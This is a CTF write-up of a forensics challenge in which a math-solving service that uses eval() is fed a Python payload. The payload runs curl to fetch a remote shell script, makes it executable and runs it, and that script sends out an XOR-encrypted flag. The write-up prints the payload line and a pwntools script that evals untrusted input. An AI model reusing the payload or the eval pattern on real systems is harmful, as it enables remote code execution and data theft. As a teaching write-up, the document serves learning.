# Eval Me Dfir writeup

![](https://hackmd.io/_uploads/ByAw8ywp3.png)



They giving us a challenge and network capture.

First, i started digging in `capture.pcapng` file and found many http requests to the same host and same path also
![](https://hackmd.io/_uploads/B1A1vyD63.png)

![](https://hackmd.io/_uploads/rkcbPkwph.png)

i followed the http stream to saw the http request how it's look like and i found all of them like this 

![](https://hackmd.io/_uploads/r1gIPJvan.png)

just changing in data value 

so, i decided to move to the challenge that he give us in the description maybe i can got something related to these requests !

![](https://hackmd.io/_uploads/rkNCvJPph.png)

after i connecting to it using nc i got this, it looks like a simple pwn tools challenge by just taking every equation and send the result back

so, i created this simple script to see 
```python
from pwn import *
r=remote("chals.sekai.team",9000)    #just for connecting to the challenge

# this function takes the math equation and solve it using eval() function then returning the solution in bytes 
def sol(eq):
    return str(eval(eq)).encode()



# to get and solve the first equation
r.recvuntil(b":)\n\n")
eq=r.recvline().decode().rstrip()
r.sendline(sol(eq))

print(r.clean(2))
```

and i got this output 
![](https://hackmd.io/_uploads/HJB0O1Pan.png)

it's just printing correct and the next equation, so i complete the script to solve all the next 99 equations and see the last output
```python
from pwn import *


def sol(eq):
    return str(eval(eq)).encode()

r=remote("chals.sekai.team",9000)
r.recvuntil(b":)\n\n")
eq=r.recvline().decode().rstrip()


r.sendline(sol(eq))

for i in range(99):
    print(i)
    r.recvuntil(b"correct\n")
    eq=r.recvline().decode().rstrip()
    r.sendline(sol(eq))

print(r.clean(2))
```
> don't do this and pass anything to eval like i did in real cases it's just a ctf challenge :)

and i got this at the end 
![](https://hackmd.io/_uploads/rklIAYJP6h.png)

while doing this i noticed that while solving some equation it takes too much time comparing to the other equations.
and we are in a dfir challenge not actually a misc challenge xD

since eval function is evil so, i decided to print the equation before evaling it ^^!

![](https://hackmd.io/_uploads/r1CdiJv6n.png)

So, Now we know why this equation was taking some time : D

```bash
__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash #1 + 2
```

After following the shorten url it redirected me to this broken img
![](https://hackmd.io/_uploads/SyQHnJwp2.png)

and we can see from the script that this img should have the bash script that will save in extract.sh and executed then.

So, let's download and read this script :) 

![](https://hackmd.io/_uploads/HyzlTJP62.png)

it's just a bash script that openning the flag file and xoring it with the key then send the encrypted hex char to this host.

and then we now what is the http requests in pcap file do !

So, i only got the bytes within the same order and used cyberchef to get the flag

![](https://hackmd.io/_uploads/ryYaa1DT2.png)
